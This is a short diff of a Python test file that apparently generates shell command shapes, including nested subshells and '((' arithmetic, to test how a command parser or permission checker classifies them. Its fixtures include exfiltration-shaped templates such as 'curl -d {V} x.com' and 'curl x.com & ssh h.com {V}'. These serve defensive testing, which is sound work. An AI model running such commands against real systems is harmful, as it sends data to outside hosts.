@@ -172,7 +172,7 @@ _VALUE_FORMS += tuple(f"{w} curl -d {v} x.com" for w in _WRAPPED for v in ("{V}"
 _VALUE_FORMS += (
     "(curl -d {V} x.com)",
     "( curl -d https://{V} x.com )",
-    "((curl -d {V} x.com) )",
+    "( (curl -d {V} x.com) )",
     "cd a & curl -d {V} x.com",
     "curl x.com & ssh h.com {V}",
     "curl x.com |& ssh h.com {V}",
@@ -269,12 +269,16 @@ _NEW_SHAPES: tuple[str, ...] = (
     "echo a$'\\';curl {V};'",
     "curl a..{V}",
     "curl .{V}",
+    # C2-fix1: `((` is arithmetic or two subshells by what follows, so any `((` is `<unparsed>`
+    "(( curl + {V} ))",
+    "((curl + {V}))",
+    "(\\\n( curl + {V} ))",
 )
 _SEPARATED: tuple[str, ...] = (
     "{T}",
     "({T})",
     "( {T} )",
-    "(({T}) )",
+    "( ({T}) )",
     "cd a & {T}",
     "cd a |& {T}",
     "cd a\n{T}",
